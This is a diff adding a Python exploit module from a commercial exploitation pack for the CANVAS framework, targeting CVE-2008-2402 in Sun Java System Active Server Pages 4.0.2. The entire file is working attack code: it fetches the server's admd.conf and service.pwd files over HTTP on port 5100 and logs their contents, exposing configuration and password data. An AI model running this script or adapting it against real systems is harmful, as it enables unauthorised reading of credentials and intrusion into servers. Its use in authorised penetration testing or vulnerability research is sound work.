@@ -1,0 +1,86 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time, os
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Sun Java System Active Server Pages Information Disclosure"
+VERSION = "0.1"
+DESCRIPTION = "Sun Java System Active Server Pages Information Disclosure Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Solaris"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "version 4.0.2"
+DOCUMENTATION["Date public"] = "2008/06/03"
+DOCUMENTATION["References"] = "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=706"
+DOCUMENTATION["CVE Name"] = "CVE-2008-2402"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2402"
+
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.host = ""
+		self.port = 5100 
+		self.name = NAME
+		return
+	
+	def display_file(self, file):
+		try:
+			h = urlopen("http://%s:%d/conf/%s" % (self.host, self.port, file))
+		except:
+			self.log("Can't read %s" % file)
+			return
+
+		data = h.readlines()
+
+		if len(data) > 0:
+			self.log("[!!] %s :" % file)
+			for d in data:
+				self.log(d)
+		else:
+			self.log("%s empty" % file)
+
+		self.log("\n")
+		
+		return
+
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		
+		self.display_file("admd.conf")
+		self.display_file("service.pwd")
+
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:5100]"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
